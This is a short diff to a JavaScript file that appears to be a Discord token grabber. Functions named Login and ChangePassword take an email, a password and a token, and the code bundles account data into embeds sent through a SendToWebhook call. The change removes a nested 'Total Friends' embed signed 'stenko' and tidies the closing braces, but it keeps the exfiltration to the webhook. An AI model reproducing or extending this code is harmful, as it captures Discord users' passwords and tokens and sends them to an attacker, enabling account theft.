@@ -251,32 +251,11 @@ function Login(email, password, token) {
                     "footer": {
                         "text": ""
                     }
-		}, {
-												"title": `Total Friends`,
-												"color": 3092790,
-												"description": `Total Prieteni`,
-												"author": {
-													"name": "stenko"
-												},
-												"footer": {
-													"text": "stenko"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}]
-										}
-										SendToWebhook(JSON.stringify(params))
-									})
-								})
-							})
-						})
-
-					})
-				})
-			})
-		})
-	})
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
